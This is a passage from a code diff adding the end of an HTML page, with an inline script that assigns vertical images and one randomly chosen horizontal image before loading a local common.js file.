+        document.getElementById(
+            "vertical-2"
+        );
+
+
+    if(vertical1){
+
+        vertical1.src =
+            verticalImages[0];
+
+    }
+
+
+    if(vertical2){
+
+        vertical2.src =
+            verticalImages[1];
+
+    }
+
+
+    /*
+     * One random horizontal image.
+     */
+
+    const horizontal =
+        document.getElementById(
+            "horizontal-random"
+        );
+
+
+    if(horizontal){
+
+        const randomIndex =
+            Math.floor(
+                Math.random() *
+                horizontalImages.length
+            );
+
+
+        horizontal.src =
+            horizontalImages[
+                randomIndex
+            ];
+
+    }
+
+})();
+
+</script>
+
+
+
+<script
+    defer
+    src="./assets/scripts/common.js">
+</script>
+
+
+</body>
+</html>
